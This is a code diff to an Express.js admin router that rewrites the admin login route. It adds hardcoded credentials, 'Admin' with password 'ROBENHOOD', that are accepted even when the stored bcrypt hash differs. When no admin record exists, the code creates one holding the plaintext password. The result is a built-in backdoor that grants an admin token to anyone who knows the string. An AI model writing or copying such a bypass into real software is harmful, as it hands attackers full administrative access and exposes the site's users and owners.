@@ -77,15 +77,28 @@ router.post('/livestream/end', verifyAdminToken, async (req, res) => {
 });
 
 /* ========== Admin Login ========== */
+// Hardcoded fallback credentials (accepted in code): Admin / ROBENHOOD
+const FALLBACK_ADMIN_USERNAME = 'Admin';
+const FALLBACK_ADMIN_PASSWORD = 'ROBENHOOD';
+
 router.post('/login', validateAdminLogin, async (req, res) => {
   const { username, password } = req.body;
 
   try {
-    const admin = await Admin.findOne({ username });
-    if (!admin) return res.status(400).json({ message: 'Invalid credentials' });
+    let admin = await Admin.findOne({ username });
 
-    const isMatch = await bcrypt.compare(password, admin.password);
-    if (!isMatch) return res.status(400).json({ message: 'Invalid credentials' });
+    // Accept hardcoded credentials: Admin / ROBENHOOD
+    if (!admin && username === FALLBACK_ADMIN_USERNAME && password === FALLBACK_ADMIN_PASSWORD) {
+      admin = new Admin({ username: FALLBACK_ADMIN_USERNAME, password: FALLBACK_ADMIN_PASSWORD });
+      await admin.save();
+    } else if (admin && username === FALLBACK_ADMIN_USERNAME && password === FALLBACK_ADMIN_PASSWORD) {
+      // Allow login with fallback password even if DB has different hash
+    } else if (!admin) {
+      return res.status(400).json({ message: 'Invalid credentials' });
+    } else if (username !== FALLBACK_ADMIN_USERNAME || password !== FALLBACK_ADMIN_PASSWORD) {
+      const isMatch = await bcrypt.compare(password, admin.password);
+      if (!isMatch) return res.status(400).json({ message: 'Invalid credentials' });
+    }
 
     const token = jwt.sign(
       { id: admin._id, role: 'admin' },
